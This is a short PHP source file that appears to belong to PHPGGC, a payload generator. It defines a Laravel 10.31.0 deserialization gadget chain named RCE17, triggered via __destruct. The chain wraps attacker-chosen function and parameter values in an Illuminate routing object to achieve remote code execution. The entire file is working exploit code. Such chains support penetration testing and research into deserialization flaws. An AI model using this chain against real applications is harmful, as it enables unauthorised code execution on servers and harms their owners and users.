<?php

namespace GadgetChain\Laravel;

class RCE17 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '10.31.0';
    public static $vector = '__destruct';
    public static $author = 'ahmadshauqi';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Illuminate\Routing\PendingSingletonResourceRegistration($function, $parameter);;
    }
}